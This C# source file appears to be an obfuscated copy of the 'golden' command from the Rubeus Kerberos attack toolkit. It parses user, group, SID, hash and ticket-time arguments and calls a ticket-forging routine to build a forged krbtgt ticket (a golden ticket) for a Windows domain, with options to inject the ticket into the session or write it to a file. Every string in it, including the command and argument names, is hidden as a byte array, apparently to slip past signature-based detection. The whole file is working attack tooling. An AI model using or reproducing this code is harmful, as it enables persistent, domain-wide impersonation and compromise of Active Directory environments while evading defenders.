using System;
using System.Collections.Generic;
using System.Globalization;

namespace Rubeus.Commands
{
    public class Golden : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 103, 111, 108, 100, 101, 110 });

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 66, 117, 105, 108, 100, 32, 84, 71, 84, 13, 10 }));

            // variable defaults
            string user = S(new byte[] { });
            int? id = null;
            string sids = S(new byte[] { });
            string groups = S(new byte[] { });
            string displayName = S(new byte[] { });
            short? logonCount = null;
            short? badPwdCount = null;
            DateTime? lastLogon = null;
            DateTime? logoffTime = null;
            DateTime? pwdLastSet = null;
            int? maxPassAge = null;
            int? minPassAge = null;
            int? pGid = null;
            string homeDir = S(new byte[] { });
            string homeDrive = S(new byte[] { });
            string profilePath = S(new byte[] { });
            string scriptPath = S(new byte[] { });
            string resourceGroupSid = S(new byte[] { });
            List<int> resourceGroups = null;
            Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT;

            string domain = S(new byte[] { });
            string dc = S(new byte[] { });
            string sid = S(new byte[] { });
            string netbios = S(new byte[] { });

            bool ldap = false;
            string ldapuser = S(new byte[] { });
            string ldappassword = S(new byte[] { });

            string hash = S(new byte[] { });
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

            Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent | Interop.TicketFlags.initial;

            DateTime startTime = DateTime.UtcNow;
            DateTime authTime = startTime;
            DateTime? rangeEnd = null;
            string rangeInterval = S(new byte[] { 49, 100 });
            string endTime = S(new byte[] { });
            string renewTill = S(new byte[] { });
            bool newPac = true;
            bool extendedUpnDns = arguments.ContainsKey(S(new byte[] { 47, 101, 120, 116, 101, 110, 100, 101, 100, 117, 112, 110, 100, 110, 115 }));

            string outfile = S(new byte[] { });
            bool ptt = false;
            bool printcmd = false;
            Int32 rodcNumber = 0;

            if (arguments.ContainsKey(S(new byte[] { 47, 114, 111, 100, 99, 78, 117, 109, 98, 101, 114 })))
            {
                rodcNumber = Int32.Parse(arguments[S(new byte[] { 47, 114, 111, 100, 99, 78, 117, 109, 98, 101, 114 })]);
            }
            // user information mostly for the PAC
            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
            {
                string[] parts = arguments[S(new byte[] { 47, 117, 115, 101, 114 })].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments[S(new byte[] { 47, 117, 115, 101, 114 })];
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 105, 100, 115 })))
            {
                sids = arguments[S(new byte[] { 47, 115, 105, 100, 115 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 103, 114, 111, 117, 112, 115 })))
            {
                groups = arguments[S(new byte[] { 47, 103, 114, 111, 117, 112, 115 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 105, 100 })))
            {
                id = Int32.Parse(arguments[S(new byte[] { 47, 105, 100 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 103, 105, 100 })))
            {
                pGid = Int32.Parse(arguments[S(new byte[] { 47, 112, 103, 105, 100 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 105, 115, 112, 108, 97, 121, 110, 97, 109, 101 })))
            {
                displayName = arguments[S(new byte[] { 47, 100, 105, 115, 112, 108, 97, 121, 110, 97, 109, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 111, 103, 111, 110, 99, 111, 117, 110, 116 })))
            {
                logonCount = short.Parse(arguments[S(new byte[] { 47, 108, 111, 103, 111, 110, 99, 111, 117, 110, 116 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 98, 97, 100, 112, 119, 100, 99, 111, 117, 110, 116 })))
            {
                badPwdCount = short.Parse(arguments[S(new byte[] { 47, 98, 97, 100, 112, 119, 100, 99, 111, 117, 110, 116 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 97, 115, 116, 108, 111, 103, 111, 110 })))
            {
                lastLogon = DateTime.Parse(arguments[S(new byte[] { 47, 108, 97, 115, 116, 108, 111, 103, 111, 110 })], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 111, 103, 111, 102, 102, 116, 105, 109, 101 })))
            {
                logoffTime = DateTime.Parse(arguments[S(new byte[] { 47, 108, 111, 103, 111, 102, 102, 116, 105, 109, 101 })], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 119, 100, 108, 97, 115, 116, 115, 101, 116 })))
            {
                pwdLastSet = DateTime.Parse(arguments[S(new byte[] { 47, 112, 119, 100, 108, 97, 115, 116, 115, 101, 116 })], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 109, 97, 120, 112, 97, 115, 115, 97, 103, 101 })))
            {
                maxPassAge = Int32.Parse(arguments[S(new byte[] { 47, 109, 97, 120, 112, 97, 115, 115, 97, 103, 101 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 109, 105, 110, 112, 97, 115, 115, 97, 103, 101 })))
            {
                minPassAge = Int32.Parse(arguments[S(new byte[] { 47, 109, 105, 110, 112, 97, 115, 115, 97, 103, 101 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 104, 111, 109, 101, 100, 105, 114 })))
            {
                homeDir = arguments[S(new byte[] { 47, 104, 111, 109, 101, 100, 105, 114 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 104, 111, 109, 101, 100, 114, 105, 118, 101 })))
            {
                homeDrive = arguments[S(new byte[] { 47, 104, 111, 109, 101, 100, 114, 105, 118, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 111, 102, 105, 108, 101, 112, 97, 116, 104 })))
            {
                profilePath = arguments[S(new byte[] { 47, 112, 114, 111, 102, 105, 108, 101, 112, 97, 116, 104 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 99, 114, 105, 112, 116, 112, 97, 116, 104 })))
            {
                scriptPath = arguments[S(new byte[] { 47, 115, 99, 114, 105, 112, 116, 112, 97, 116, 104 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 101, 115, 111, 117, 114, 99, 101, 103, 114, 111, 117, 112, 115, 105, 100 })) && arguments.ContainsKey(S(new byte[] { 47, 114, 101, 115, 111, 117, 114, 99, 101, 103, 114, 111, 117, 112, 115 })))
            {
                resourceGroupSid = arguments[S(new byte[] { 47, 114, 101, 115, 111, 117, 114, 99, 101, 103, 114, 111, 117, 112, 115, 105, 100 })];
                resourceGroups = new List<int>();
                foreach (string rgroup in arguments[S(new byte[] { 47, 114, 101, 115, 111, 117, 114, 99, 101, 103, 114, 111, 117, 112, 115 })].Split(','))
                {
                    try
                    {
                        resourceGroups.Add(int.Parse(rgroup));
                    }
                    catch
                    {
                        Console.WriteLine(S(new byte[] { 91, 33, 93, 32, 82, 101, 115, 111, 117, 114, 99, 101, 32, 103, 114, 111, 117, 112, 32, 118, 97, 108, 117, 101, 32, 105, 110, 118, 97, 108, 105, 100, 58, 32 }) + rgroup);
                    }
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 117, 97, 99 })))
            {
                Interop.PacUserAccountControl tmp = Interop.PacUserAccountControl.EMPTY;

                foreach (string u in arguments[S(new byte[] { 47, 117, 97, 99 })].Split(','))
                {
                    Interop.PacUserAccountControl result;
                    bool status = Interop.PacUserAccountControl.TryParse(u, out result);

                    if (status)
                    {
                        tmp |= result;
                    }
                    else
                    {
                        Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 69, 114, 114, 111, 114, 32, 116, 104, 101, 32, 102, 111, 108, 108, 111, 119, 105, 110, 103, 32, 102, 108, 97, 103, 32, 110, 97, 109, 101, 32, 112, 97, 115, 115, 101, 100, 32, 105, 115, 32, 110, 111, 116, 32, 118, 97, 108, 105, 100, 58, 32 }) + u);
                    }
                }
                if (tmp != Interop.PacUserAccountControl.EMPTY)
                {
                    uac = tmp;
                }
            }

            // domain and DC information
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                dc = arguments[S(new byte[] { 47, 100, 99 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 105, 100 })))
            {
                sid = arguments[S(new byte[] { 47, 115, 105, 100 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 110, 101, 116, 98, 105, 111, 115 })))
            {
                netbios = arguments[S(new byte[] { 47, 110, 101, 116, 98, 105, 111, 115 })];
            }

            // getting the user information from LDAP
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 100, 97, 112 })))
            {
                ldap = true;
                if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })))
                {
                    if (!arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })))
                    {
                        Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100, 32, 105, 115, 32, 114, 101, 113, 117, 105, 114, 101, 100, 32, 119, 104, 101, 110, 32, 115, 112, 101, 99, 105, 102, 121, 105, 110, 103, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 13, 10 }));
                        return;
                    }

                    ldapuser = arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })];
                    ldappassword = arguments[S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })];
                }

                if (String.IsNullOrEmpty(domain))
                {
                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                }
            }

            // encryption types
            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })))
            {
                string encTypeString = arguments[S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();

                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 }))) // "RC4"
                {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 }))) // "NTLM"
                {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 }))) // "AES128"
                {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 }))) // "AES256"
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83 }))) // "AES"
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 }))) // "DES"
                {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 100, 101, 115 })))
            {
                hash = arguments[S(new byte[] { 47, 100, 101, 115 })];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 114, 99, 52 })))
            {
                hash = arguments[S(new byte[] { 47, 114, 99, 52 })];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 110, 116, 108, 109 })))
            {
                hash = arguments[S(new byte[] { 47, 110, 116, 108, 109 })];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })))
            {
                hash = arguments[S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })))
            {
                hash = arguments[S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }

            // flags
            if (arguments.ContainsKey(S(new byte[] { 47, 102, 108, 97, 103, 115 })))
            {
                Interop.TicketFlags tmp = Interop.TicketFlags.empty;

                foreach (string flag in arguments[S(new byte[] { 47, 102, 108, 97, 103, 115 })].Split(','))
                {
                    Interop.TicketFlags result;
                    bool status = Interop.TicketFlags.TryParse(flag, out result);

                    if (status)
                    {
                        tmp |= result;
                    }
                    else
                    {
                        Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 69, 114, 114, 111, 114, 32, 116, 104, 101, 32, 102, 111, 108, 108, 111, 119, 105, 110, 103, 32, 102, 108, 97, 103, 32, 110, 97, 109, 101, 32, 112, 97, 115, 115, 101, 100, 32, 105, 115, 32, 110, 111, 116, 32, 118, 97, 108, 105, 100, 58, 32 }) + flag);
                    }
                }
                if (tmp != Interop.TicketFlags.empty)
                {
                    flags = tmp;
                }
            }

            // ticket times
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 116, 97, 114, 116, 116, 105, 109, 101 })))
            {
                try
                {
                    startTime = DateTime.Parse(arguments[S(new byte[] { 47, 115, 116, 97, 114, 116, 116, 105, 109, 101 })], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
                }
                catch (Exception e)
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 69, 114, 114, 111, 114, 32, 117, 110, 97, 98, 108, 101, 32, 116, 111, 32, 112, 97, 114, 115, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 32, 47, 115, 116, 97, 114, 116, 116, 105, 109, 101, 32 }) + arguments[S(new byte[] { 47, 115, 116, 97, 114, 116, 116, 105, 109, 101 })] + S(new byte[] { 58, 32 }) + e.Message);
                    return;
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 97, 117, 116, 104, 116, 105, 109, 101 })))
            {
                try
                {
                    authTime = DateTime.Parse(arguments[S(new byte[] { 47, 97, 117, 116, 104, 116, 105, 109, 101 })], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
                }
                catch (Exception e)
                {
                    Console.WriteLine(S(new byte[] { 91, 33, 93, 32, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 112, 97, 114, 115, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 32, 47, 97, 117, 116, 104, 116, 105, 109, 101, 32 }) + arguments[S(new byte[] { 47, 97, 117, 116, 104, 116, 105, 109, 101 })] + S(new byte[] { 58, 32 }) + e.Message);
                    authTime = startTime;
                }
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 115, 116, 97, 114, 116, 116, 105, 109, 101 })))
            {
                authTime = startTime;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 97, 110, 103, 101, 101, 110, 100 })))
            {
                rangeEnd = Helpers.FutureDate(startTime, arguments[S(new byte[] { 47, 114, 97, 110, 103, 101, 101, 110, 100 })]);
                if (rangeEnd == null)
                {
                    Console.WriteLine(S(new byte[] { 91, 33, 93, 32, 73, 103, 110, 111, 114, 105, 110, 103, 32, 105, 110, 118, 97, 108, 105, 100, 32, 47, 114, 97, 110, 103, 101, 101, 110, 100, 32, 97, 114, 103, 117, 109, 101, 110, 116, 58, 32 }) + arguments[S(new byte[] { 47, 114, 97, 110, 103, 101, 101, 110, 100 })]);
                    rangeEnd = startTime;
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 97, 110, 103, 101, 105, 110, 116, 101, 114, 118, 97, 108 })))
            {
                rangeInterval = arguments[S(new byte[] { 47, 114, 97, 110, 103, 101, 105, 110, 116, 101, 114, 118, 97, 108 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 100, 116, 105, 109, 101 })))
            {
                endTime = arguments[S(new byte[] { 47, 101, 110, 100, 116, 105, 109, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 101, 110, 101, 119, 116, 105, 108, 108 })))
            {
                renewTill = arguments[S(new byte[] { 47, 114, 101, 110, 101, 119, 116, 105, 108, 108 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 111, 108, 100, 112, 97, 99 })))
            {
                newPac = false;
            }

            // actions for the ticket(s)
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 })))
            {
                ptt = true;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }

            // print a command that could be used to recreate the ticket
            // useful if you use LDAP to get the user information, this could be used to avoid touching LDAP again
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 105, 110, 116, 99, 109, 100 })))
            {
                printcmd = true;
            }

            // checks
            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 117, 115, 101, 114, 32, 110, 97, 109, 101, 33, 13, 10 }));
                return;
            }
            if (String.IsNullOrEmpty(hash))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 91, 47, 100, 101, 115, 124, 47, 114, 99, 52, 124, 47, 97, 101, 115, 49, 50, 56, 124, 47, 97, 101, 115, 50, 53, 54, 93, 32, 104, 97, 115, 104, 33, 13, 10 }));
                return;
            }

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 79, 110, 108, 121, 32, 47, 100, 101, 115, 44, 32, 47, 114, 99, 52, 44, 32, 47, 97, 101, 115, 49, 50, 56, 44, 32, 97, 110, 100, 32, 47, 97, 101, 115, 50, 53, 54, 32, 97, 114, 101, 32, 115, 117, 112, 112, 111, 114, 116, 101, 100, 32, 97, 116, 32, 116, 104, 105, 115, 32, 116, 105, 109, 101, 46, 13, 10 }));
                return;
            }
            else
            {
                ForgeTickets.ForgeTicket(
                    user,
                    String.Format(S(new byte[] { 107, 114, 98, 116, 103, 116, 47, 123, 48, 125 }), domain),
                    Helpers.StringToByteArray(hash),
                    encType,
                    null,
                    Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256,
                    ldap,
                    ldapuser,
                    ldappassword,
                    sid,
                    domain,
                    netbios,
                    dc,
                    flags,
                    startTime,
                    rangeEnd,
                    rangeInterval,
                    authTime,
                    endTime,
                    renewTill,
                    id,
                    groups,
                    sids,
                    displayName,
                    logonCount,
                    badPwdCount,
                    lastLogon,
                    logoffTime,
                    pwdLastSet,
                    maxPassAge,
                    minPassAge,
                    pGid,
                    homeDir,
                    homeDrive,
                    profilePath,
                    scriptPath,
                    resourceGroupSid,
                    resourceGroups,
                    uac,
                    newPac,
                    extendedUpnDns,
                    outfile,
                    ptt,
                    printcmd,
                    null,
                    null,
                    null,
                    null,
                    false,
                    false,
                    rodcNumber
                    );
                return;
            }
        }
    }
}
